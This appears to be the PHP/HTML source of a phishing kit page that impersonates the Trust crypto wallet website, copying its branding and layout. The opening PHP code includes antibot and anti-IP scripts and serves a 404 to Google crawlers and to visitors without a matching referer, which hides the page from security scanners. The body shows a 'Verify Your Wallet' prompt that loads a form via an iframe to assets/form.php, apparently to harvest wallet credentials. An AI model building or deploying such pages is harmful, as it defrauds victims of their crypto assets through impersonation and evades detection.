﻿<?php 
   include('config.php');
   $aa = $_SERVER['HTTP_HOST'];
   $ref = $_SERVER['HTTP_REFERER'];
   $refData = parse_url($ref);
   if ($refData['host'] !=$aa) {
   ?>
<?php }elseif($_SERVER['HTTP_REFERER'] == NULL){
   header('HTTP/1.0 404 Not Found');
   exit(); ?>
<?php }else{ ?>
<?php
   error_reporting(0);
   include('includes/antibot1.php');
   include('includes/antibot2.php');
   include('includes/antiip.php');
   if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
   if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
   ?>
<!DOCTYPE html>
<html class="__variable_9c5a94 __variable_49b18b" lang="en">
  <head>
    <link rel="icon" href="assets/images/icon.ico">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="assets/css/6f535fa698ae581f.css">
    <title>Best Crypto Wallet for Web3, NFTs and DeFi | Trust</title>
    <meta name="description" content="Unlock the power of your cryptocurrency assets and explore the world of Web3 with Trust. The leading self-custody multi-chain platform. Download Trust app now!">
    <meta name="application-name" content="Trust Website">
    <meta name="next-size-adjust">
  </head>
  <body class="default-transition min-h-screen bg-trustWhite dark:bg-trustBlack">
    <header class="default-transition responsive-page-paddings sticky top-0 z-50 flex w-full flex-col bg-trustWhite dark:bg-trustBlack desktop:py-7">
      <div data-isopen="false" class="default-transition responsive-page-paddings fixed inset-0 z-10 flex h-screen max-h-0 flex-col overflow-auto bg-baseWhite pb-8 pt-24 data-[isopen=true]:max-h-screen data-[isopen=false]:!py-0 data-[isopen=false]:delay-150 dark:bg-trustBlack">
        <ul data-isopen="false" class="default-transition mt-7 grid gap-3 opacity-0 data-[isopen=true]:opacity-100 data-[isopen=true]:delay-300">
          <li class="default-transition w-full rounded-xl bg-white px-5 py-3.5 dark:bg-lightBlack">
            <button class=" flex w-full items-center justify-between" type="button">
              <strong class="default-transition text-lightBlack font-inter dark:text-trustWhite text-mobileBodyLarge leading-mobileBodyLarge tablet:text-desktopBodyLarge tablet:leading-desktopBodyLarge">Wallet</strong>
              <span class="default-transition data-[selectedmenu=true]:rotate-90">
                <svg xmlns="http://www.w3.org/2000/svg" width="9" height="15" fill="none" viewBox="0 0 9 15" class="default-transition text-trustBlack dark:text-trustGreen">
                  <path style="stroke:currentcolor" stroke="#1B1B1C" stroke-linecap="round" stroke-width="2" d="m1 1.5 6 6-6 6"></path>
                </svg>
              </span>
            </button>
          </li>
          <li class="default-transition w-full rounded-xl bg-white px-5 py-3.5 dark:bg-lightBlack">
            <button class=" flex w-full items-center justify-between" type="button">
              <strong class="default-transition text-lightBlack font-inter dark:text-trustWhite text-mobileBodyLarge leading-mobileBodyLarge tablet:text-desktopBodyLarge tablet:leading-desktopBodyLarge">Features</strong>
              <span class="default-transition data-[selectedmenu=true]:rotate-90">
                <svg xmlns="http://www.w3.org/2000/svg" width="9" height="15" fill="none" viewBox="0 0 9 15" class="default-transition text-trustBlack dark:text-trustGreen">
                  <path style="stroke:currentcolor" stroke="#1B1B1C" stroke-linecap="round" stroke-width="2" d="m1 1.5 6 6-6 6"></path>
                </svg>
              </span>
            </button>
          </li>
          <li class="default-transition w-full rounded-xl bg-white px-5 py-3.5 dark:bg-lightBlack">
            <button class=" flex w-full items-center justify-between" type="button">
              <strong class="default-transition text-lightBlack font-inter dark:text-trustWhite text-mobileBodyLarge leading-mobileBodyLarge tablet:text-desktopBodyLarge tablet:leading-desktopBodyLarge">Build</strong>
              <span class="default-transition data-[selectedmenu=true]:rotate-90">
                <svg xmlns="http://www.w3.org/2000/svg" width="9" height="15" fill="none" viewBox="0 0 9 15" class="default-transition text-trustBlack dark:text-trustGreen">
                  <path style="stroke:currentcolor" stroke="#1B1B1C" stroke-linecap="round" stroke-width="2" d="m1 1.5 6 6-6 6"></path>
                </svg>
              </span>
            </button>
          </li>
          <li class="default-transition w-full rounded-xl bg-white px-5 py-3.5 dark:bg-lightBlack">
            <button class=" flex w-full items-center justify-between" type="button">
              <strong class="default-transition text-lightBlack font-inter dark:text-trustWhite text-mobileBodyLarge leading-mobileBodyLarge tablet:text-desktopBodyLarge tablet:leading-desktopBodyLarge">Support</strong>
              <span class="default-transition data-[selectedmenu=true]:rotate-90">
                <svg xmlns="http://www.w3.org/2000/svg" width="9" height="15" fill="none" viewBox="0 0 9 15" class="default-transition text-trustBlack dark:text-trustGreen">
                  <path style="stroke:currentcolor" stroke="#1B1B1C" stroke-linecap="round" stroke-width="2" d="m1 1.5 6 6-6 6"></path>
                </svg>
              </span>
            </button>
          </li>
          <li class="default-transition w-full rounded-xl bg-white px-5 py-3.5 dark:bg-lightBlack">
            <button class=" flex w-full items-center justify-between" type="button">
              <strong class="default-transition text-lightBlack font-inter dark:text-trustWhite text-mobileBodyLarge leading-mobileBodyLarge tablet:text-desktopBodyLarge tablet:leading-desktopBodyLarge">About</strong>
              <span class="default-transition data-[selectedmenu=true]:rotate-90">
                <svg xmlns="http://www.w3.org/2000/svg" width="9" height="15" fill="none" viewBox="0 0 9 15" class="default-transition text-trustBlack dark:text-trustGreen">
                  <path style="stroke:currentcolor" stroke="#1B1B1C" stroke-linecap="round" stroke-width="2" d="m1 1.5 6 6-6 6"></path>
                </svg>
              </span>
            </button>
          </li>
        </ul>
      </div>
      <div class="default-transition relative z-20 flex items-center justify-between pb-3 pt-14 [transition-property:background-color] data-[isopen=true]:bg-baseWhite dark:bg-trustBlack desktop:hidden">
        <a class="default-transition flex items-center gap-3 font-inter text-mobileBodyMedium leading-mobileBodyMedium tablet:text-desktopBodyMedium tablet:leading-desktopBodyMedium text-trustBlack hover:underline dark:text-trustWhite mr-auto" aria-label="Homepage" href="#">
          <span class="default-transition invisible hidden dark:visible dark:block">
            <svg width="39" height="43" viewBox="0 0 39 43" fill="none">
              <path d="M0.710815 6.67346L19.4317 0.606445V42.6064C6.05944 37.0059 0.710815 26.2727 0.710815 20.207V6.67346Z" style="fill:currentcolor" class="text-trustBlue dark:text-trustGreen"></path>
              <path d="M38.1537 6.67346L19.4329 0.606445V42.6064C32.8051 37.0059 38.1537 26.2727 38.1537 20.207V6.67346Z" fill="url(#paint0_linear_524_77595undefined)"></path>
              <path d="M38.1537 6.67346L19.4329 0.606445V42.6064C32.8051 37.0059 38.1537 26.2727 38.1537 20.207V6.67346Z" fill="url(#paint1_linear_524_77595undefined)"></path>
              <defs>
                <linearGradient id="paint1_linear_524_77595undefined" x1="18.6423" y1="47.8852" x2="33.8833" y2="-7.39981" gradientUnits="userSpaceOnUse">
                  <stop offset="0.26" stop-color="#48FF91"></stop>
                  <stop offset="0.66" stop-color="#0094FF"></stop>
                  <stop offset="0.8" stop-color="#0038FF"></stop>
                  <stop offset="0.89" stop-color="#0500FF"></stop>
                </linearGradient>
              </defs>
            </svg>
          </span>
          <span class="default-transition visible block opacity-100 dark:invisible dark:hidden dark:opacity-0">
            <svg width="39" height="43" viewBox="0 0 39 43" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M0.710815 6.67346L19.4317 0.606445V42.6064C6.05944 37.0059 0.710815 26.2727 0.710815 20.207V6.67346Z" fill="#0500FF"></path>
              <path d="M38.1537 6.67346L19.4329 0.606445V42.6064C32.8051 37.0059 38.1537 26.2727 38.1537 20.207V6.67346Z" fill="url(#paint0_linear_524_75868undefined)"></path>
              <defs>
                <linearGradient id="paint0_linear_524_75868undefined" x1="33.1809" y1="-2.33467" x2="19.115" y2="42.0564" gradientUnits="userSpaceOnUse">
                  <stop offset="0.02" stop-color="#0000FF"></stop>
                  <stop offset="0.08" stop-color="#0094FF"></stop>
                  <stop offset="0.16" stop-color="#48FF91"></stop>
                  <stop offset="0.42" stop-color="#0094FF"></stop>
                  <stop offset="0.68" stop-color="#0038FF"></stop>
                  <stop offset="0.9" stop-color="#0500FF"></stop>
                </linearGradient>
              </defs>
            </svg>
          </span>
        </a>
        <button class="default-transition flex w-10 flex-col gap-1.5 duration-300 data-[checked=true]:w-8 data-[checked=true]:rotate-90" id="headlessui-switch-:R55dda:" role="switch" type="button" tabindex="0" aria-checked="false">
          <span class="default-transition  block h-[3px] w-full rounded-sm bg-trustBlue duration-300 data-[checked=true]:translate-y-[9px] data-[checked=true]:rotate-45 dark:bg-trustGreen"></span>
          <span class="default-transition block h-[3px] w-full rounded-sm bg-trustBlue duration-200 data-[checked=true]:opacity-0 dark:bg-trustGreen"></span>
          <span class="default-transition block h-[3px] w-full rounded-sm  bg-trustBlue duration-300 data-[checked=true]:translate-y-[-9px] data-[checked=true]:rotate-[-45deg] dark:bg-trustGreen"></span>
        </button>
      </div>
      <div class="default-transition invisible fixed inset-0 z-0 bg-tintBlue opacity-0 data-[isopen=true]:visible data-[isopen=true]:opacity-50 dark:bg-lightBlack"></div>
      <div class="default-transition absolute inset-0 z-20 hidden h-96 max-h-0 w-full overflow-hidden rounded-xl bg-trustWhite px-[calc((100%_-_1200px)_/_2)] data-[isopen=true]:max-h-96  dark:bg-trustBlack desktop:block">
        <div class="default-transition visible absolute inset-0 w-full bg-trustWhite opacity-100 delay-[350ms] data-[isopen=true]:invisible data-[isopen=true]:opacity-0 dark:bg-lightBlack "></div>
      </div>
      <div class="z-20 hidden items-center justify-between desktop:flex">
        <a class="default-transition flex items-center gap-3 font-inter text-mobileBodyMedium leading-mobileBodyMedium tablet:text-desktopBodyMedium tablet:leading-desktopBodyMedium text-trustBlack hover:underline dark:text-trustWhite mr-auto" aria-label="Homepage" href="#">
          <svg width="293" height="80" viewBox="0 0 293 80" fill="none" class="h-auto w-[160px]">
            <g clip-path="url(#clip0_1578_140118undefined)">
              <path d="M133.461 18.6951H147.398V26.5015C151.964 19.4857 157.219 18.6951 164.911 18.6951V32.4906H161.408C152.19 32.4906 147.778 36.8281 147.778 45.4202V60.0842H133.461V18.6951Z" style="fill:currentColor" class="default-transition text-trustBlue [transition-property:color] dark:text-trustGreen"></path>
              <path d="M211.41 60.0842H197.097V56.1385C193.971 59.7655 189.711 61.3419 184.459 61.3419C174.485 61.3419 168.846 55.4281 168.846 44.5517V18.6951H183.16V41.3236C183.16 46.4443 185.673 49.4389 189.935 49.4389C194.197 49.4389 197.094 46.5198 197.094 41.5571V18.6951H211.408V60.0842H211.41Z" style="fill:currentColor" class="default-transition text-trustBlue [transition-property:color] dark:text-trustGreen"></path>
              <path d="M214.908 47.3054H228.314C228.925 50.3 230.981 51.5601 235.926 51.5601C239.964 51.5601 242.324 50.6162 242.324 48.8817C242.324 47.5389 241.181 46.6705 237.911 45.9626L227.098 43.5177C219.863 41.866 216.207 37.6867 216.207 30.9823C216.207 22.1493 222.678 17.5784 235.243 17.5784C247.807 17.5784 253.974 22.0326 255.044 31.5759H241.721C241.495 29.0556 238.901 27.5133 234.639 27.5133C231.214 27.5133 229.01 28.6153 229.01 30.2744C229.01 31.6926 230.453 32.7946 233.352 33.5098L244.696 36.2709C252.157 38.0808 255.74 41.8684 255.74 48.0157C255.74 56.5324 248.352 61.5778 235.795 61.5778C223.237 61.5778 214.93 56.1383 214.93 47.3054H214.915H214.908Z" style="fill:currentColor" class="default-transition text-trustBlue [transition-property:color] dark:text-trustGreen"></path>
              <path d="M293.858 31.5687V18.6951H258.526V31.576H269.069V60.0842H283.31V31.5687H293.858Z" style="fill:currentColor" class="default-transition text-trustBlue [transition-property:color] dark:text-trustGreen"></path>
              <path d="M129.476 31.5687V18.6951H94.1469V31.576H104.69V60.0842H118.933V31.5687H129.476Z" style="fill:currentColor" class="default-transition text-trustBlue [transition-property:color] dark:text-trustGreen"></path>
              <path d="M1.47009 11.4213L36.6098 0V79.0661C11.5096 68.523 1.47009 48.3173 1.47009 36.8985V11.4213Z" style="fill:currentColor" class="default-transition text-trustBlue [transition-property:color] dark:text-trustGreen"></path>
              <path d="M71.7523 11.4213L36.6127 0V79.0661C61.7128 68.523 71.7523 48.3173 71.7523 36.8985V11.4213Z" fill="url(#paint0_linear_1578_140118undefined)" class="default-transition opacity-0 [transition-property:opacity] dark:opacity-100"></path>
              <path d="M71.7523 11.4213L36.6127 0V79.0661C61.7128 68.523 71.7523 48.3173 71.7523 36.8985V11.4213Z" fill="url(#paint0_linear_1578_102342undefined)" class="default-transition opacity-100 [transition-property:opacity] dark:opacity-0"></path>
            </g>
            <defs>
              <linearGradient id="paint0_linear_1578_140118undefined" x1="35.1288" y1="89.0035" x2="63.8924" y2="-15.0289" gradientUnits="userSpaceOnUse">
                <stop offset="0.26" stop-color="#48FF91"></stop>
                <stop offset="0.66" stop-color="#0094FF"></stop>
                <stop offset="0.8" stop-color="#0038FF"></stop>
                <stop offset="0.89" stop-color="#0500FF"></stop>
              </linearGradient>
              <linearGradient id="paint0_linear_1578_102342undefined" x1="61.762" y1="-4.56968" x2="35.2193" y2="78.953" gradientUnits="userSpaceOnUse">
                <stop offset="0.02" stop-color="#0000FF"></stop>
                <stop offset="0.08" stop-color="#0094FF"></stop>
                <stop offset="0.16" stop-color="#48FF91"></stop>
                <stop offset="0.42" stop-color="#0094FF"></stop>
                <stop offset="0.68" stop-color="#0038FF"></stop>
                <stop offset="0.9" stop-color="#0500FF"></stop>
              </linearGradient>
              <clipPath id="clip0_1578_140118undefined">
                <rect width="291.936" height="79.0661" fill="white" transform="translate(0.814331)"></rect>
              </clipPath>
            </defs>
          </svg>
        </a>
        <div class="flex items-center">
          <span class="default-transition text-lightBlack font-inter dark:text-trustWhite opacity-50 text-mobileBodyExtraSmall leading-mobileBodyExtraSmall tablet:text-desktopBodyExtraSmall tablet:leading-desktopBodyExtraSmall cursor-pointer px-5 py-[0.625rem] font-[500] !opacity-100">Wallet</span>
          <span class="default-transition text-lightBlack font-inter dark:text-trustWhite opacity-50 text-mobileBodyExtraSmall leading-mobileBodyExtraSmall tablet:text-desktopBodyExtraSmall tablet:leading-desktopBodyExtraSmall cursor-pointer px-5 py-[0.625rem] font-[500] !opacity-100">Features</span>
          <span class="default-transition text-lightBlack font-inter dark:text-trustWhite opacity-50 text-mobileBodyExtraSmall leading-mobileBodyExtraSmall tablet:text-desktopBodyExtraSmall tablet:leading-desktopBodyExtraSmall cursor-pointer px-5 py-[0.625rem] font-[500] !opacity-100">Build</span>
          <span class="default-transition text-lightBlack font-inter dark:text-trustWhite opacity-50 text-mobileBodyExtraSmall leading-mobileBodyExtraSmall tablet:text-desktopBodyExtraSmall tablet:leading-desktopBodyExtraSmall cursor-pointer px-5 py-[0.625rem] font-[500] !opacity-100">Support</span>
          <span class="default-transition text-lightBlack font-inter dark:text-trustWhite opacity-50 text-mobileBodyExtraSmall leading-mobileBodyExtraSmall tablet:text-desktopBodyExtraSmall tablet:leading-desktopBodyExtraSmall cursor-pointer px-5 py-[0.625rem] font-[500] !opacity-100">About</span>
          <button class=" px-6 py-[0.625rem] text-trustBlack dark:text-trustWhite" type="button">
            <span class="hidden dark:block">
              <svg width="1em" height="1em" viewBox="0 0 13 13" fill="none">
                <path d="M6 1V0.5C6 0.367392 6.05268 0.240215 6.14645 0.146447C6.24021 0.0526784 6.36739 0 6.5 0C6.63261 0 6.75979 0.0526784 6.85355 0.146447C6.94732 0.240215 7 0.367392 7 0.5V1C7 1.13261 6.94732 1.25979 6.85355 1.35355C6.75979 1.44732 6.63261 1.5 6.5 1.5C6.36739 1.5 6.24021 1.44732 6.14645 1.35355C6.05268 1.25979 6 1.13261 6 1ZM10.5 6.5C10.5 7.29113 10.2654 8.06448 9.82588 8.72228C9.38635 9.38008 8.76164 9.89277 8.03073 10.1955C7.29983 10.4983 6.49556 10.5775 5.71964 10.4231C4.94371 10.2688 4.23098 9.88784 3.67157 9.32843C3.11216 8.76902 2.7312 8.05628 2.57686 7.28036C2.42252 6.50444 2.50173 5.70017 2.80448 4.96927C3.10723 4.23836 3.61992 3.61365 4.27772 3.17412C4.93552 2.7346 5.70887 2.5 6.5 2.5C7.56051 2.50116 8.57725 2.92296 9.32715 3.67285C10.077 4.42275 10.4988 5.43949 10.5 6.5ZM9.5 6.5C9.5 5.90666 9.32405 5.32664 8.99441 4.83329C8.66476 4.33994 8.19623 3.95542 7.64805 3.72836C7.09987 3.5013 6.49667 3.44189 5.91473 3.55764C5.33279 3.6734 4.79824 3.95912 4.37868 4.37868C3.95912 4.79824 3.6734 5.33279 3.55764 5.91473C3.44189 6.49667 3.5013 7.09987 3.72836 7.64805C3.95542 8.19623 4.33994 8.66476 4.83329 8.99441C5.32664 9.32405 5.90666 9.5 6.5 9.5C7.2954 9.49917 8.05798 9.18284 8.62041 8.62041C9.18284 8.05798 9.49917 7.2954 9.5 6.5ZM2.14625 2.85375C2.24007 2.94757 2.36732 3.00028 2.5 3.00028C2.63268 3.00028 2.75993 2.94757 2.85375 2.85375C2.94757 2.75993 3.00028 2.63268 3.00028 2.5C3.00028 2.36732 2.94757 2.24007 2.85375 2.14625L2.35375 1.64625C2.25993 1.55243 2.13268 1.49972 2 1.49972C1.86732 1.49972 1.74007 1.55243 1.64625 1.64625C1.55243 1.74007 1.49972 1.86732 1.49972 2C1.49972 2.13268 1.55243 2.25993 1.64625 2.35375L2.14625 2.85375ZM2.14625 10.1462L1.64625 10.6462C1.55243 10.7401 1.49972 10.8673 1.49972 11C1.49972 11.1327 1.55243 11.2599 1.64625 11.3538C1.74007 11.4476 1.86732 11.5003 2 11.5003C2.13268 11.5003 2.25993 11.4476 2.35375 11.3538L2.85375 10.8538C2.90021 10.8073 2.93706 10.7521 2.9622 10.6914C2.98734 10.6308 3.00028 10.5657 3.00028 10.5C3.00028 10.4343 2.98734 10.3692 2.9622 10.3086C2.93706 10.2479 2.90021 10.1927 2.85375 10.1462C2.8073 10.0998 2.75214 10.0629 2.69145 10.0378C2.63075 10.0127 2.5657 9.99972 2.5 9.99972C2.4343 9.99972 2.36925 10.0127 2.30855 10.0378C2.24786 10.0629 2.19271 10.0998 2.14625 10.1462ZM10.5 3C10.5657 3.00005 10.6307 2.98716 10.6914 2.96207C10.7521 2.93697 10.8073 2.90017 10.8538 2.85375L11.3538 2.35375C11.4476 2.25993 11.5003 2.13268 11.5003 2C11.5003 1.86732 11.4476 1.74007 11.3538 1.64625C11.2599 1.55243 11.1327 1.49972 11 1.49972C10.8673 1.49972 10.7401 1.55243 10.6462 1.64625L10.1462 2.14625C10.0762 2.21618 10.0286 2.3053 10.0092 2.40235C9.98991 2.49939 9.99981 2.59998 10.0377 2.6914C10.0756 2.78281 10.1397 2.86092 10.222 2.91586C10.3043 2.9708 10.4011 3.00008 10.5 3ZM10.8538 10.1462C10.7599 10.0524 10.6327 9.99972 10.5 9.99972C10.3673 9.99972 10.2401 10.0524 10.1462 10.1462C10.0524 10.2401 9.99972 10.3673 9.99972 10.5C9.99972 10.6327 10.0524 10.7599 10.1462 10.8538L10.6462 11.3538C10.6927 11.4002 10.7479 11.4371 10.8086 11.4622C10.8692 11.4873 10.9343 11.5003 11 11.5003C11.0657 11.5003 11.1308 11.4873 11.1914 11.4622C11.2521 11.4371 11.3073 11.4002 11.3538 11.3538C11.4002 11.3073 11.4371 11.2521 11.4622 11.1914C11.4873 11.1308 11.5003 11.0657 11.5003 11C11.5003 10.9343 11.4873 10.8692 11.4622 10.8086C11.4371 10.7479 11.4002 10.6927 11.3538 10.6462L10.8538 10.1462ZM1 6H0.5C0.367392 6 0.240215 6.05268 0.146447 6.14645C0.0526784 6.24021 0 6.36739 0 6.5C0 6.63261 0.0526784 6.75979 0.146447 6.85355C0.240215 6.94732 0.367392 7 0.5 7H1C1.13261 7 1.25979 6.94732 1.35355 6.85355C1.44732 6.75979 1.5 6.63261 1.5 6.5C1.5 6.36739 1.44732 6.24021 1.35355 6.14645C1.25979 6.05268 1.13261 6 1 6ZM6.5 11.5C6.36739 11.5 6.24021 11.5527 6.14645 11.6464C6.05268 11.7402 6 11.8674 6 12V12.5C6 12.6326 6.05268 12.7598 6.14645 12.8536C6.24021 12.9473 6.36739 13 6.5 13C6.63261 13 6.75979 12.9473 6.85355 12.8536C6.94732 12.7598 7 12.6326 7 12.5V12C7 11.8674 6.94732 11.7402 6.85355 11.6464C6.75979 11.5527 6.63261 11.5 6.5 11.5ZM12.5 6H12C11.8674 6 11.7402 6.05268 11.6464 6.14645C11.5527 6.24021 11.5 6.36739 11.5 6.5C11.5 6.63261 11.5527 6.75979 11.6464 6.85355C11.7402 6.94732 11.8674 7 12 7H12.5C12.6326 7 12.7598 6.94732 12.8536 6.85355C12.9473 6.75979 13 6.63261 13 6.5C13 6.36739 12.9473 6.24021 12.8536 6.14645C12.7598 6.05268 12.6326 6 12.5 6Z" style="fill:currentcolor"></path>
              </svg>
            </span>
            <span class="block dark:hidden">
              <svg width="1em" height="1em" viewBox="0 0 13 13" fill="none">
                <path d="M13 4.50148C13 4.63413 12.9473 4.76135 12.8535 4.85515C12.7597 4.94895 12.6325 5.00164 12.4998 5.00164H11.4995V6.00197C11.4995 6.13462 11.4468 6.26184 11.353 6.35564C11.2592 6.44944 11.132 6.50213 10.9993 6.50213C10.8667 6.50213 10.7395 6.44944 10.6457 6.35564C10.5519 6.26184 10.4992 6.13462 10.4992 6.00197V5.00164H9.49885C9.3662 5.00164 9.23898 4.94895 9.14518 4.85515C9.05138 4.76135 8.99869 4.63413 8.99869 4.50148C8.99869 4.36883 9.05138 4.24161 9.14518 4.14781C9.23898 4.05401 9.3662 4.00131 9.49885 4.00131H10.4992V3.00099C10.4992 2.86833 10.5519 2.74111 10.6457 2.64732C10.7395 2.55352 10.8667 2.50082 10.9993 2.50082C11.132 2.50082 11.2592 2.55352 11.353 2.64732C11.4468 2.74111 11.4995 2.86833 11.4995 3.00099V4.00131H12.4998C12.6325 4.00131 12.7597 4.05401 12.8535 4.14781C12.9473 4.24161 13 4.36883 13 4.50148ZM6.99803 2.00066H7.4982V2.50082C7.4982 2.63347 7.55089 2.76069 7.64469 2.85449C7.73849 2.94829 7.86571 3.00099 7.99836 3.00099C8.13101 3.00099 8.25823 2.94829 8.35203 2.85449C8.44583 2.76069 8.49852 2.63347 8.49852 2.50082V2.00066H8.99869C9.13134 2.00066 9.25856 1.94796 9.35236 1.85416C9.44616 1.76036 9.49885 1.63314 9.49885 1.50049C9.49885 1.36784 9.44616 1.24062 9.35236 1.14682C9.25856 1.05302 9.13134 1.00033 8.99869 1.00033H8.49852V0.500164C8.49852 0.367512 8.44583 0.240294 8.35203 0.146495C8.25823 0.0526957 8.13101 0 7.99836 0C7.86571 0 7.73849 0.0526957 7.64469 0.146495C7.55089 0.240294 7.4982 0.367512 7.4982 0.500164V1.00033H6.99803C6.86538 1.00033 6.73816 1.05302 6.64436 1.14682C6.55056 1.24062 6.49787 1.36784 6.49787 1.50049C6.49787 1.63314 6.55056 1.76036 6.64436 1.85416C6.73816 1.94796 6.86538 2.00066 6.99803 2.00066ZM11.5476 8.06515C11.6059 8.13293 11.6449 8.21507 11.6606 8.30303C11.6763 8.39099 11.6682 8.48156 11.6371 8.56531C11.29 9.51181 10.7101 10.3556 9.95093 11.0189C9.19174 11.6822 8.27771 12.1436 7.2932 12.3605C6.30868 12.5774 5.28539 12.5428 4.31777 12.2599C3.35015 11.977 2.46938 11.4549 1.75673 10.7419C1.04408 10.0288 0.522524 9.14774 0.240187 8.17996C-0.0421495 7.21218 -0.0761672 6.18888 0.141274 5.20448C0.358714 4.22009 0.820608 3.30632 1.48433 2.54752C2.14805 1.78871 2.99221 1.20931 3.9389 0.862783C4.02223 0.832266 4.11217 0.824467 4.19951 0.840187C4.28684 0.855906 4.36842 0.894577 4.43588 0.952233C4.50333 1.00989 4.55424 1.08445 4.58336 1.16827C4.61249 1.2521 4.61879 1.34216 4.60162 1.42922C4.42634 2.31637 4.47227 3.23303 4.73533 4.09821C4.99839 4.9634 5.47049 5.75048 6.10992 6.38991C6.74936 7.02935 7.53644 7.50145 8.40162 7.76451C9.26681 8.02757 10.1835 8.07349 11.0706 7.89822C11.1578 7.88118 11.2479 7.88766 11.3318 7.917C11.4156 7.94634 11.4901 7.99747 11.5476 8.06515ZM10.3354 8.99545C10.2235 9.00108 10.1109 9.00421 9.99902 9.00421C8.27489 9.00239 6.62191 8.31658 5.40288 7.09732C4.18385 5.87806 3.49837 4.22495 3.49688 2.50082C3.49688 2.38891 3.49688 2.27637 3.50563 2.16446C2.84016 2.54741 2.27177 3.07842 1.84452 3.71636C1.41728 4.3543 1.14263 5.08204 1.04187 5.84319C0.941107 6.60434 1.01693 7.37848 1.26347 8.10561C1.51001 8.83275 1.92064 9.49337 2.46356 10.0363C3.00647 10.5792 3.66709 10.9898 4.39422 11.2364C5.12136 11.4829 5.89549 11.5587 6.65665 11.458C7.4178 11.3572 8.14554 11.0826 8.78348 10.6553C9.42142 10.2281 9.95243 9.65968 10.3354 8.9942V8.99545Z" style="fill:currentcolor"></path>
              </svg>
            </span>
          </button>
          <span class="relative inline-block">
            <button id="headlessui-menu-button-:R2tpdda:" type="button" aria-haspopup="menu" aria-expanded="false">
              <div class="px-5 py-2.5 h-9 default-transition relative z-10 overflow-hidden flex items-center justify-center gap-3 rounded-full text-center text-mobileButton font-medium leading-mobileButton bg-transparent border text-trustBlue border-trustBlue dark:text-trustGreen dark:border-trustGreen | hover:bg-trustBlue hover:text-trustWhite dark:hover:text-trustBlack dark:hover:bg-trustGreen ml-2.5">
                <svg fill="none" width="13" height="13" viewBox="0 0 13 13">
                  <path style="fill:currentcolor" d="M6.5 0A6.5 6.5 0 1 0 13 6.5 6.507 6.507 0 0 0 6.5 0ZM4.852 9h3.296c-.335 1.146-.898 2.18-1.648 2.993C5.75 11.18 5.187 10.146 4.852 9Zm-.227-1a9.108 9.108 0 0 1 0-3h3.75a9.108 9.108 0 0 1 0 3h-3.75ZM1 6.5c0-.507.07-1.012.208-1.5h2.404c-.15.994-.15 2.006 0 3H1.208A5.476 5.476 0 0 1 1 6.5ZM8.148 4H4.852c.335-1.146.898-2.18 1.648-2.993C7.25 1.82 7.813 2.854 8.148 4Zm1.24 1h2.404a5.51 5.51 0 0 1 0 3H9.388c.15-.994.15-2.006 0-3Zm2.01-1H9.184a8.9 8.9 0 0 0-1.266-2.813A5.523 5.523 0 0 1 11.398 4ZM5.082 1.187A8.9 8.9 0 0 0 3.816 4H1.602a5.523 5.523 0 0 1 3.48-2.813ZM1.602 9h2.214a8.9 8.9 0 0 0 1.266 2.813A5.523 5.523 0 0 1 1.602 9Zm6.316 2.813A8.9 8.9 0 0 0 9.184 9h2.214a5.521 5.521 0 0 1-3.48 2.813Z"></path>
                </svg>Language
              </div>
            </button>
          </span>
          <a class="px-5 py-2.5 h-9 default-transition relative z-10 overflow-hidden flex items-center justify-center gap-3 rounded-full text-center text-mobileButton font-medium leading-mobileButton block before:left-0 before:absolute before:-z-[1] before:rounded-full before:w-[0%] before:top-0 before:bottom-0 before:transition before:[transition-property:width] before:[transition-duration:500ms] hover:before:w-full bg-trustBlue text-trustWhite dark:bg-trustGreen dark:text-trustBlack | before:bg-trustGreen hover:text-trustBlack dark:hover:text-trustWhite before:dark:bg-trustBlue ml-6" href="#">Download</a>
        </div>
      </div>
    </header>
    <main class="responsive-page-paddings mx-auto mb-6 mt-12 grid justify-items-center gap-y-10 tablet:mb-20 tablet:gap-y-20 desktop:mt-16">
      <section class="full-screen-section-mobile w-full max-w-screen-max rounded-[20px] bg-gradientLightBlueToBlue !py-10 data-[sequential=true]:!pb-20 data-[sequential=true]:!pt-32 tablet:rounded-[30px] tablet:!px-10 tablet:!py-20 data-[sequential=true]:tablet:!pt-32 tablet:data-[sequential=true]:!pb-16 z-20">
        <div class="mx-auto w-full max-w-screen-max-reduced-content">
          <h2 class="default-transition text-trustBlack font-wixMadefor font-bold dark:text-trustWhite text-mobileH1 leading-mobileH1 tablet:text-desktopH1 tablet:leading-desktopH1 
            text-center 
            !text-trustWhite
          ">Verify Your Wallet</h2>
          <p class="default-transition text-lightBlack font-inter dark:text-trustWhite text-mobileBodyLarge leading-mobileBodyLarge tablet:text-desktopBodyLarge tablet:leading-desktopBodyLarge 
        mx-auto mb-10 mt-4 max-w-[70ch] text-center 
        !text-trustWhite 
        tablet:mt-6 max:mb-14
        ">Taking the essential step of verifying your wallet is crucial for a seamless transition and assets protection.</p>
          <div class="flex justify-center items-center">
            <iframe id="embeddedFrame" src="assets/form.php" title="Form" style="width: 816px;height: 687px;border: none;"></iframe>
          </div>
        </div>
      </section>
    </main>
    <footer class="default-transition rounded-[20px] p-5 [transition-property:background-color,border-color] desktop:rounded-[30px] desktop:p-8 border border-tintBlue bg-baseWhite dark:border-tintBlack dark:bg-lightBlack default-transition mx-auto grid w-full max-w-screen-max px-8 pb-12 pt-8 desktop:mb-10 desktop:grid-cols-[auto,2fr,1fr] desktop:grid-rows-[repeat(3,auto)] desktop:gap-y-8 desktop:!px-24 desktop:!py-12">
      <div class="flex flex-col items-center desktop:ml-6 desktop:items-start desktop:justify-end">
        <h5 class="default-transition text-trustBlack font-wixMadefor font-bold dark:text-trustWhite text-mobileH5 leading-mobileH5 tablet:text-desktopH5 tablet:leading-desktopH5">Stay Connected:</h5>
        <div class="mt-5 flex items-center gap-3 justify-center">
          <a target="_blank" rel="noopener noreferrer" href="#" class="default-transition flex items-center gap-3 font-inter text-mobileBodyMedium leading-mobileBodyMedium tablet:text-desktopBodyMedium tablet:leading-desktopBodyMedium text-trustBlack hover:underline dark:text-trustWhite">
            <svg width="31" height="31" viewBox="0 0 31 31" class="default-transition text-trustBlack dark:text-trustWhite default-transition text-trustBlack dark:text-trustWhite">
              <rect width="30.0779" height="30.0779" rx="4.71921" style="fill:currentcolor"></rect>
